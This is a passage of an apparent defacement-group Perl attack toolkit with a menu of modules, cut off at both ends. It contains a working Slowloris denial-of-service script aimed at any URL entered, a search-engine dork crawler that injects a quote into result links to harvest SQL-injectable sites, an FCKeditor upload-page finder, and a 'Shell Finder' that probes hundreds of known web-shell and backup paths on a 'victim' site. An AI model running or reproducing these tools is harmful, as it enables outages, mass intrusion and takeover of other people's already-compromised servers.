    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://co.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub taiwan() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://tw.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub swiss() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://ch.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub mexico() {
    my @list;
        my $key = $_[0];
        my $b     = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://mx.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub Uk() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://co.uk.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub Israel() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://co.il.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub french() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://fr.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
sub Tunisia() {
    my @list;
  my $key = $_[0];
  my $b   = 0;
    for (my $i=1; $i<=200; $i+=100) {
        my $search = ("http://tn.search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = &links($link); push(@list,@grep);
            }
        }
    } return @list;
}
################################################
sub search_engine_query() {
        my $url = $_[0];
        $url =~ s/http:\/\///;
        my $host = $url;
        my $query = $url;
        my $page  = "";
        $host =~ s/href=\"?http:\/\///;
        $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
        $query =~ s/$host//;
        if ($query eq "") { $query = "/"; }
                eval {
                        my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
                        my $sget = "GET $query HTTP/1.0\r\n";
                        $sget .= "Host: $host\r\n";
                        $sget .= "Accept: */*\r\n";
                        $sget .= "User-Agent: $uagent\r\n";
                        $sget .= "Connetion: Close\r\n\r\n";
                        print $sock $sget;
                        my @pages = <$sock>;
                        $page = "@pages";
                        close($sock);
                };
        return $page;
}

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub links() {
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(15);
    my $response = $ua->request($req);
    return $response->content;
}

sub printlog {
my ($logsec,$logmin,$loghour,$logmday,$logmon,$logyear,$logwday,$logyday,$logisdst)=localtime(time);
my $logtimestamp = sprintf("%4d-%02d-%02d,%02d:%02d:%02d",$logyear+1900,$logmon+1,$logmday,$loghour,$logmin,$logsec);
$logmon++;
$logyear=$logyear+1900;
my $log="[$logdir$logyear-$logmon-$logmday]SQLscan.log";
open(lo,">>$log") or die "$log:$!";
print lo @_[0];
close(lo);
return;
}}
}
if($targett eq '11')
{
system('cls');
system('title FckEditor Dir Tester');
                    {
use HTTP::Request;
use LWP::UserAgent;

system('cls');
system(' Title FckEditor Dir Tester');
system "color a";
print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                    F4cK3 3d!t0r Dir Tester                         >\n";
print "\t>                                                                  >\n";
print "\t>                     Created By Fallag crx                          >\n";
print "\t>       	fallaga  | Team                     >\n";
print "\t>                    Result In FckEditor.txt                       >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

print " Enter The Site\n\n Example: www.victim.com \n\n-> ";


$site=<STDIN>;
chomp $site;

if($site !~ /http:\/\//) { $site = "http://$site/"; };

print "\n";

@path = ('/editor/editor/filemanager/connectors/uploadtest.html',
'/editor/editor/filemanager/upload/test.html',
'/editor/editor/filemanager/browser/default/connectors/test.html',
'/editor/editor/filemanager/connectors/test.html',
'/admin/fckeditor/editor/filemanager/connectors/test.html',
'/FCKeditor/editor/filemanager/upload/test.html',
'/Fckeditor/editor/filemanager/browser/default/connectors/test.html',
'/admin/FCKeditor/editor/filemanager/connectors/uploadtest.html',
'/admin/FCKeditor/editor/filemanager/upload/test.html',
'/Fckeditor/editor/filemanager/connectors/test.html',
'/admin/fckeditor/editor/filemanager/browser/default/connectors/test.html',
'/FCKeditor/editor/filemanager/connectors/uploadtest.html',
'/js/fckeditor/editor/filemanager/connectors/test.html',
'/admin/FCKeditor/editor/filemanager/connectors/test.html',
'/admin/FCKeditor/editor/fckeditor.html',
'/include/fckeditor/_samples/default.html',
'/include/fckeditor/editor/filemanager/connectors/test.html',);


foreach $fckeditor(@path){

$url = $site.$fckeditor;
$req = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success){
print "$fckeditor\n";
 $url = substr($url, $fckeditor + 13);
 $fckeditor = substr($url, 0, index($url, '"'));
 open (txt,">>FckEditor.txt");
 print txt  $fckeditor,"\n";
 close(txt);
print "=> Dir Found : $url\n";
}
else {
print "=> Not Found : $fckeditor\n";
}}
}}
if($targett eq '16')
{
system('cls');
system('title DDOS');
                    {
use strict;
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;


$SIG{'PIPE'} = 'IGNORE';    #Ignore broken pipe errors


my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'dns=s'     => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

print "[+] Enter Url For DDOS: ";
chomp ($host = <STDIN>);

if ($version) {
    print "Version 0.7\n";
    exit;
}

unless ($port) {
    $port = 80;
    print "Defaulting to port 80.\n";
}


unless ($tcpto) {
    $tcpto = 5;
    print "Defaulting to a 5 second tcp connection timeout.\n";
}


unless ($test) {
    unless ($timeout) {
        $timeout = 100;
        print "Defaulting to a 100 second re-try timeout.\n";
    }
    unless ($connections) {
        $connections = 1000;
        print "Defaulting to 1000 connections.\n";
    }
}


my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    print "Multithreading enabled.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No multithreading capabilites found!\n";
    print "Slowloris will be slower than normal as a result.\n";
}


my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;


srand() if ($cache);


if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}


if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "This test could take up to $totaltime minutes.\n";


    my $delay   = 0;
    my $working = 0;
    my $sock;


    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "Connection successful, now comes the waiting game...\n";
        }
        else {
            print
"That's odd - I connected but couldn't send the data to $host:$port.\n";
            print "Is something wrong?\nDying.\n";
            exit;
        }
    }
    else {
        print "Uhm... I can't connect to $host:$port.\n";
        print "Is something wrong?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Trying a $times[$i] second delay: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tWorked.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tFailed after $times[$i] seconds.\n";
        }
    }


    if ( print $sock "Connection: Close\r\n\r\n" ) {
        print "Okay that's enough time. Slowloris closed the socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    else {
        print "Remote server closed socket.\n";
        print "Use $delay seconds for -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Since the timeout ended up being so small ($delay seconds) and it generally
takes between 200-500 threads for most servers and assuming any latency at
all...  you might have trouble using Slowloris against this target.  You can
tweak the -timeout flag down to less than 10 seconds but it still may not
build the sockets in time.
EOSUCKS2BU
    }
}
else {
    print
"Connecting to $host:$port every $timeout seconds with $connections sockets:\n";


    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}


sub doconnections {
    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        print "\t\tBuilding sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print "\t\tSending data.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        print
"Current stats:\tSlowloris has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}


sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
}}
}}
if($targett eq '3')
{
system('cls');
system('title Dorker Bing');
                    {
use strict;
use warnings;
use HTTP::Request;
use LWP::UserAgent;

###############
my $dork;
my $url;
my $i;
my $request;
my $useragent;
my $response;
my $start;
my $end;
my $result;
my $fl;
my $link;
my $req;
my $ua;
my $result2;
my $res;
my $save;
my $pages;
my $page;
my $choice;
##############
my @z;

print q{
################################
##      / SQLi Crawler /      ##
##       Fallaga Team       ##
##   ~ReCoded by Fallag crx~    ##
################################

};

MainMenu:

print "------------------------\n";
print "Enter [1] To Begin SQLi.\n";
print "Enter [2] To Exit.\n";
print "------------------------\n\n";
print "Your Choice: ";

chomp ($choice = <STDIN>);
print "\n";

if ($choice eq 1) {&sql_scan}
if ($choice eq 5) {die;}

sub sql_scan
{

print "[+] Enter Bing! dork: ";
chomp ($dork = <STDIN>);
print "\n";
print "[+] How Many Pages To Leech?: ";
chomp ($pages = <STDIN>);
print "\n";

$page = $pages.'1';

print "[~] Crawling...\n\n";

for ($i = 0; $i <= $page; $i=$i+11)
{

$url = "http://www.bing.com/search?q=$dork&go=&qs=n&sk=&sc=8-13&first=$i";

$request = HTTP::Request->new(GET => $url);
$useragent = LWP::UserAgent->new();
$response = $useragent->request($request);
$result = $response->content;

$start = '<h3><a href="';
$end = '" onmousedown=';

while ($result =~ m/$start(.*?)$end/g)

{
	 $fl = $1;
	 $link = $fl."%27";
	 $req = HTTP::Request->new(GET => $link);
	 $ua = LWP::UserAgent->new();
	 $res = $ua->request($req);
	 $result2 = $res->content;

	  if ($result2=~ m/You have an error in your SQL syntax/i || $result2=~ m/Query failed/i || $result2=~ m/SQL query failed/i || $result2=~ m/mysql_fetch_/i || $result2=~ m/mysql_fetch_array/i || $result2 =~ m/mysql_num_rows/i || $result2 =~ m/The used SELECT statements have a different number of columns/i )
	  {
	  	push @z, $link;
	  	print "[+] MySQL Vulnerable: $link\n\n";
	  }

	  elsif ($result2 =~ m/Microsoft JET Database/i || $result2 =~ m/ODBC Microsoft Access Driver/i )
	  {
	  	push @z, $link;
	  	print "[+] MsSQL Vulnerable: $link\n\n";
	  }

	  else {

	  		print "[-] $link <- Not Vulnerable\n\n";
	  }
}

}
	print "Vulnerable Links:\n";
	print "-----------------------------------\n";
foreach (@z)
{
	print "$_ \n\n";
}
print "Save Into A Text File? (Y or N): ";
chomp ($save = <STDIN>);

if ($save eq 'Y')
{
	print "Saving File...\n\n";
	open(vuln_file, ">>Vulns.txt");
	foreach (@z)
	{
		print vuln_file "$_ \n";
	}
	close(vuln_file);
	print "File Saved!\n\n";
}
goto MainMenu;
}}
}
if($targett eq '1')
{
system('cls');
system('title Dir Finder');
                    {
                        print " Shell Finder \n";
use HTTP::Request;
use LWP::UserAgent;

system('cls');
system('title Dir Finder Rec0ded by Fallag crx');
print"\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\t>                              Shell Finder                        >\n";
print "\t>                          C0ded by Fallag crx                        >\n";
print "\t>       	                 Fallaga Team                          >\n";
print "\t>                          Result In Done.txt                       >\n";
print  "\t>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\n";
print "\n";

print " Scan Your site Site\n\n Example: www.victim.com \n\n-> ";


$site=<STDIN>;
chomp $site;

if($site !~ /http:\/\//) { $site = "http://$site/"; };

print "\n";

@path =  ('WSO.php','dz.php','w.php','wp-content/plugins/akismet/akismet.php','images/stories/w.php','w.php','shell.php','cpanel.php','cpn.php','sql.php','mysql.php','config. ​ php','configuration.php','madspot.php','Cgishell.pl','killer.php','changeall.php ​ ','2.php','Sh3ll.php','dz0.php','dam.php','user.php','dom.php','whmcs.php','r00t ​ .php','1.php','a.php','r0k.php','abc.php','egy.php','syrian_shell.php','xxx.php' &#8203; ,'settings.php','tmp.php','cyber.php','c99.php','r57.php','404.php','gaza.php',' ​ 1.php','d4rk.php','index1.php','nkr.php','xd.php','M4r0c.php','Dz.php','sniper.p ​ hp','ksa.php','v4team.php','offline.php','priv8.php','911.php','madspotshell.php ​ ','c100.php','sym.php','cp.php','tmp/cpn.php','tmp/w.php','tmp/r57.php','tmp/king.php','tmp/sok.php','tmp/ss.php','tmp/as.php','tmp/dz.php','tmp/r1z.php','tmp/whmcs.php','tmp/root.php','tmp/r00t.php','templates/beez/index.php','templates/beez/beez.php','templates/rhuk_milkyway/index.php','tmp/uploads.php','tmp/upload.php','tmp/sa.php','sa.php','readme.php','tmp/readme.php','wp.zip'.'wp-content/plugins/disqus-comment-system/disqus.php',
'd0mains.php','wp-content/plugins/akismet/akismet.php','madspotshell.php','info.php','egyshell.php','Sym.php','c22.php','c ​100.php',
'wp-content/plugins/akismet/admin.php#','configuration.php','g.php','wp-content/plugins/google-sitemap-generator/sitemap-core.php#',
'wp-content/plugins/akismet/widget.php#','xx.pl','ls.php','Cpanel.php','k.php','zone-h.php','tmp/user.php','tmp/Sym.php','cp.php',
'tmp/madspotshell.php','tmp/root.php','tmp/whmcs.php','tmp/index.php','tmp/2.php','tmp/dz.php','tmp/cpn.php',
'tmp/changeall.php','tmp/Cgishell.pl','tmp/sql.php','0day.php','tmp/admin.php','cliente/downloads/h4xor.php',
'whmcs/downloads/dz.php','L3b.php','d.php','tmp/d.php','tmp/L3b.php','wp-content/plugins/akismet/admin.php',
'templates/rhuk_milkyway/index.php','templates/beez/index.php','sado.php','admin1.php','upload.php','up.php','vb.zip','vb.rar',
'admin2.asp','uploads.php','sa.php','sysadmins/','admin1/','sniper.php','administration/Sym.php','images/Sym.php',
'/r57.php','/wp-content/plugins/disqus-comment-system/disqus.php','gzaa_spysl','sql-new.php','/shell.php','/sa.php','/admin.php',
'/sa2.php','/2.php','/gaza.php','/up.php','/upload.php','/uploads.php','/templates/beez/index.php','shell.php','/amad.php',
'/t00.php','/dz.php','/site.rar','/Black.php','/site.tar.gz','/home.zip','/home.rar','/home.tar','/home.tar.gz',
'/forum.zip','/forum.rar','/forum.tar','/forum.tar.gz','/test.txt','/ftp.txt','/user.txt','/site.txt','/error_log','/error',
'/cpanel','/awstats','/site.sql','/vb.sql','/forum.sql','r00t-s3c.php','c.php','/backup.sql','/back.sql','/data.sql','wp.rar/',
'wp-content/plugins/disqus-comment-system/disqus.php','asp.aspx','/templates/beez/index.php','tmp/vaga.php',
'tmp/killer.php','whmcs.php','abuhlail.php','tmp/killer.php','tmp/domaine.pl','tmp/domaine.php','useradmin/',
'tmp/d0maine.php','d0maine.php','tmp/sql.php','X.php','123.php','m.php','b.php','up.php','tmp/dz1.php','dz1.php','forum.zip','Symlink.php','Symlink.pl',
'forum.rar','joomla.zip','joomla.rar','wp.php','buck.sql','sysadmin.php','images​/c99.php', 'xd.php', 'c100.php',
'spy.aspx','xd.php','tmp/xd.php','sym/root/home/','billing/killer.php','tmp/upload.php','tmp/admin.php',
'Server.php','tmp/uploads.php','tmp/up.php','Server/','wp-admin/c99.php','tmp/priv8.php','priv8.php','cgi.pl/',
'tmp/cgi.pl','downloads/dom.php','templates/ja-helio-farsi/index.php','webadmin.html','admins.php',
'/wp-content/plugins/count-per-day/js/yc/d00.php','bluff.php','king.jeen','admins/','admins.asp','admins.php','wp.zip','/wp-content/plugins/disqus-comment-system/WSO.php',
'/wp-content/plugins/disqus-comment-system/dz.php',
'/wp-content/plugins/disqus-comment-system/DZ.php',
'/wp-content/plugins/disqus-comment-system/cpanel.php',
'/wp-content/plugins/disqus-comment-system/cpn.php',
'/wp-content/plugins/disqus-comment-system/sos.php',
'/wp-content/plugins/disqus-comment-system/term.php',
'/wp-content/plugins/disqus-comment-system/Sec-War.php',
'/wp-content/plugins/disqus-comment-system/sql.php',
'/wp-content/plugins/disqus-comment-system/ssl.php',
'/wp-content/plugins/disqus-comment-system/mysql.php',
'/wp-content/plugins/disqus-comment-system/WolF.php',
'/wp-content/plugins/disqus-comment-system/madspot.php',
'/wp-content/plugins/disqus-comment-system/Cgishell.pl',
'/wp-content/plugins/disqus-comment-system/killer.php',
'/wp-content/plugins/disqus-comment-system/changeall.php',
'/wp-content/plugins/disqus-comment-system/2.php',
'/wp-content/plugins/disqus-comment-system/Sh3ll.php',
'/wp-content/plugins/disqus-comment-system/dz0.php',
'/wp-content/plugins/disqus-comment-system/dam.php',
'/wp-content/plugins/disqus-comment-system/user.php',
'/wp-content/plugins/disqus-comment-system/dom.php',
'/wp-content/plugins/disqus-comment-system/whmcs.php',
'/wp-content/plugins/disqus-comment-system/vb.zip',
'/wp-content/plugins/disqus-comment-system/r00t.php',
'/wp-content/plugins/disqus-comment-system/c99.php',
'/wp-content/plugins/disqus-comment-system/gaza.php',
'/wp-content/plugins/disqus-comment-system/1.php',
'/wp-content/plugins/disqus-comment-system/d0mains.php',
'/wp-content/plugins/disqus-comment-system/madspotshell.php',
'/wp-content/plugins/disqus-comment-system/info.php',
'/wp-content/plugins/disqus-comment-system/egyshell.php',
'/wp-content/plugins/disqus-comment-system/Sym.php',
'/wp-content/plugins/disqus-comment-system/c22.php',
'/wp-content/plugins/disqus-comment-system/c100.php',
'/wp-content/plugins/disqus-comment-system/configuration.php',
'/wp-content/plugins/disqus-comment-system/g.php',
'/wp-content/plugins/disqus-comment-system/xx.pl',
'/wp-content/plugins/disqus-comment-system/ls.php',
'/wp-content/plugins/disqus-comment-system/Cpanel.php',
'/wp-content/plugins/disqus-comment-system/k.php',
'/wp-content/plugins/disqus-comment-system/zone-h.php',
'/wp-content/plugins/disqus-comment-system/tmp/user.php',
'/wp-content/plugins/disqus-comment-system/tmp/Sym.php',
'/wp-content/plugins/disqus-comment-system/cp.php',
'/wp-content/plugins/disqus-comment-system/tmp/madspotshell.php',
'/wp-content/plugins/disqus-comment-system/tmp/root.php',
'/wp-content/plugins/disqus-comment-system/tmp/whmcs.php',
'/wp-content/plugins/disqus-comment-system/tmp/index.php',
'/wp-content/plugins/disqus-comment-system/tmp/2.php',
'/wp-content/plugins/disqus-comment-system/tmp/dz.php',
'/wp-content/plugins/disqus-comment-system/tmp/cpn.php',
'/wp-content/plugins/disqus-comment-system/tmp/changeall.php',
'/wp-content/plugins/disqus-comment-system/tmp/Cgishell.pl',
'/wp-content/plugins/disqus-comment-system/tmp/sql.php',
'/wp-content/plugins/disqus-comment-system/0day.php',
'/wp-content/plugins/disqus-comment-system/tmp/admin.php',
'/wp-content/plugins/disqus-comment-system/L3b.php',
'/wp-content/plugins/disqus-comment-system/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/d.php',
'/wp-content/plugins/disqus-comment-system/tmp/L3b.php',
'/wp-content/plugins/disqus-comment-system/sado.php',
'/wp-content/plugins/disqus-comment-system/admin1.php',
'/wp-content/plugins/disqus-comment-system/upload.php',
'/wp-content/plugins/disqus-comment-system/up.php',
'/wp-content/plugins/disqus-comment-system/vb.zip',
'/wp-content/plugins/disqus-comment-system/vb.rar',
'/wp-content/plugins/disqus-comment-system/admin2.asp',
'/wp-content/plugins/disqus-comment-system/uploads.php',
'/wp-content/plugins/disqus-comment-system/sa.php',
'/wp-content/plugins/disqus-comment-system/sysadmins/',
'/wp-content/plugins/disqus-comment-system/admin1/',
'/wp-content/plugins/disqus-comment-system/sniper.php',
'/wp-content/plugins/disqus-comment-system/images/Sym.php',
'/wp-content/plugins/disqus-comment-system//r57.php',
'/wp-content/plugins/disqus-comment-system/gzaa_spysl',
'/wp-content/plugins/disqus-comment-system/sql-new.php',
'/wp-content/plugins/disqus-comment-system//shell.php',
'/wp-content/plugins/disqus-comment-system//sa.php',
'/wp-content/plugins/disqus-comment-system//admin.php',
'/wp-content/plugins/disqus-comment-system//sa2.php',
'/wp-content/plugins/disqus-comment-system//2.php',
'/wp-content/plugins/disqus-comment-system//gaza.php',
'/wp-content/plugins/disqus-comment-system//up.php',
'/wp-content/plugins/disqus-comment-system//upload.php',
'/wp-content/plugins/disqus-comment-system//uploads.php',
'/wp-content/plugins/disqus-comment-system/shell.php',
'/wp-content/plugins/disqus-comment-system//amad.php',
'/wp-content/plugins/disqus-comment-system//t00.php',
'pwp-content/plugins/disqus-comment-system/disqus.php',
'wp-content/plugins/akismet/WSO.php',
'wp-content/plugins/akismet/dz.php',
'wp-content/plugins/akismet/DZ.php',
'wp-content/plugins/akismet/cpanel.php',
'wp-content/plugins/akismet/cpn.php',
'wp-content/plugins/akismet/sos.php',
'wp-content/plugins/akismet/term.php',
'wp-content/plugins/akismet/Sec-War.php',
'wp-content/plugins/akismet/sql.php',
'wp-content/plugins/akismet/ssl.php',
'wp-content/plugins/akismet/mysql.php',
'wp-content/plugins/akismet/WolF.php',
'wp-content/plugins/akismet/madspot.php',
'wp-content/plugins/akismet/Cgishell.pl',
'wp-content/plugins/akismet/killer.php',
'wp-content/plugins/akismet/changeall.php',
'wp-content/plugins/akismet/2.php',
'wp-content/plugins/akismet/Sh3ll.php',
'wp-content/plugins/akismet/dz0.php',
'wp-content/plugins/akismet/dam.php',
'wp-content/plugins/akismet/user.php',
'wp-content/plugins/akismet/dom.php',
'wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/vb.zip',
'wp-content/plugins/akismet/r00t.php',
'wp-content/plugins/akismet/c99.php',
'wp-content/plugins/akismet/gaza.php',
'wp-content/plugins/akismet/1.php',
'wp-content/plugins/akismet/d0mains.php',
'wp-content/plugins/akismet/madspotshell.php',
'wp-content/plugins/akismet/info.php',
'wp-content/plugins/akismet/egyshell.php',
'wp-content/plugins/akismet/Sym.php',
'wp-content/plugins/akismet/c22.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/configuration.php',
'wp-content/plugins/akismet/g.php',
'wp-content/plugins/akismet/xx.pl',
'wp-content/plugins/akismet/ls.php',
'wp-content/plugins/akismet/Cpanel.php',
'wp-content/plugins/akismet/k.php',
'wp-content/plugins/akismet/zone-h.php',
'wp-content/plugins/akismet/tmp/user.php',
'wp-content/plugins/akismet/tmp/Sym.php',
'wp-content/plugins/akismet/cp.php',
'wp-content/plugins/akismet/tmp/madspotshell.php',
'wp-content/plugins/akismet/tmp/root.php',
'wp-content/plugins/akismet/tmp/whmcs.php',
'wp-content/plugins/akismet/tmp/index.php',
'wp-content/plugins/akismet/tmp/2.php',
'wp-content/plugins/akismet/tmp/dz.php',
'wp-content/plugins/akismet/tmp/cpn.php',
'wp-content/plugins/akismet/tmp/changeall.php',
'wp-content/plugins/akismet/tmp/Cgishell.pl',
'wp-content/plugins/akismet/tmp/sql.php',
